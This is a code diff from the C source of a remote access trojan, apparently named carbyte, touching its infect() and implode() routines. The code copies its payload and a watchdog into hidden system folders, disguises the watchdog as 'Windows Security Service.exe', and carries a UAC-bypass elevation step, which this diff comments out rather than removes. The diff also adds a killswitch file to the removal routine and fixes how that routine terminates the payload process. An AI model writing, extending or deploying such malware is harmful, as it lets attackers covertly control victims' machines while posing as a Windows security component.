@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <conio.h>
+#include <io.h>
 
 #include "utils.h"
 #include "payload.h"
@@ -35,15 +36,15 @@ void infect(){
 
     
     /* Try to aquire elevated privileges */
-    if(!IsElevated()){
-        if(!BypassUAC(path)){
-            printf("Failed to elevate privileges, continue\n");
-        } else {
-            printf("Elevation successfull\n");
-            exit(0);
-        }
-        /* TODO: Check if WD was triggered */
-    }
+    // if(!IsElevated()){
+    //     if(!BypassUAC(path)){
+    //         printf("Failed to elevate privileges, continue\n");
+    //     } else {
+    //         printf("Elevation successfull\n");
+    //         exit(0);
+    //     }
+    //     /* TODO: Check if WD was triggered */
+    // }
 
 
     /* Copy all the executables */
@@ -59,7 +60,9 @@ void infect(){
     strcat(executableDestination, serviceName);    // Add the directory
     strcat(executableDestination, "\\");
     CreateDirectoryA(executableDestination, NULL); // Create the directory
-    SetFileAttributesA(executableDestination, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); // Set the attributes to hidden & system
+    SetFileAttributesA(executableDestination, 
+                        FILE_ATTRIBUTE_HIDDEN | 
+                        FILE_ATTRIBUTE_SYSTEM);    // Set the attributes to hidden & system
     strcat(executableDestination, serviceName);    // Add the service name
     strcat(executableDestination, ".exe");         // Add the extension
 
@@ -73,9 +76,11 @@ void infect(){
     // Copy the executable into the watchdog destination
     char watchdogDestination[MAX_PATH];
     strcpy(watchdogDestination, destination);
-    strcat(watchdogDestination, "AMS\\");                              // Add the directory
-    CreateDirectoryA(watchdogDestination, NULL);                       // Create the directory
-    SetFileAttributesA(watchdogDestination, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); // Set the attributes to hidden & system
+    strcat(watchdogDestination, "AMS\\");                        // Add the directory
+    CreateDirectoryA(watchdogDestination, NULL);                 // Create the directory
+    SetFileAttributesA(watchdogDestination, 
+                        FILE_ATTRIBUTE_HIDDEN | 
+                        FILE_ATTRIBUTE_SYSTEM);                  // Set the attributes to hidden & system
     strcat(watchdogDestination, "Windows Security Service.exe"); // Add the service name
 
     status = CopyFileA(path, watchdogDestination, FALSE);
@@ -134,6 +139,19 @@ void infect(){
 // Remove the RAT
 void implode(){
     /* Stop the processes */
+    char processName[sizeof(serviceName) + 4];
+    strcpy(processName, serviceName);
+    strcat(processName, ".exe");
+
+    // Create killswitch
+    char killswitchDestination[MAX_PATH];
+    GetDestination(killswitchDestination);
+    strcat(killswitchDestination, serviceName);
+    strcat(killswitchDestination, "\\");
+    strcat(killswitchDestination, "carbyte_killswitch");
+    HANDLE hKillswitchFile = CreateFileA(killswitchDestination, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if(hKillswitchFile != INVALID_HANDLE_VALUE) CloseHandle(hKillswitchFile);
+
     if(findFirstProc("Windows Security Service.exe") != 0){
         printf("Stopping watchdog\n");
         HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, findFirstProc("Windows Security Service.exe"));
@@ -145,12 +163,9 @@ void implode(){
             printf("Failed to stop watchdog\n");
         }
     }
-    char processName[sizeof(serviceName) + 4];
-    strcpy(processName, serviceName);
-    strcat(processName, ".exe");
     if(findFirstProc(processName) != 0){
         printf("Stopping payload\n");
-        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, findFirstProc(serviceName));
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, findFirstProc(processName));
         if(hProcess != NULL){
             TerminateProcess(hProcess, 0);
             CloseHandle(hProcess);
@@ -168,6 +183,7 @@ void implode(){
         }
     }
 
+    DeleteFileA(killswitchDestination); // Delete the killswitch
 
     /* Remove persistance */
 
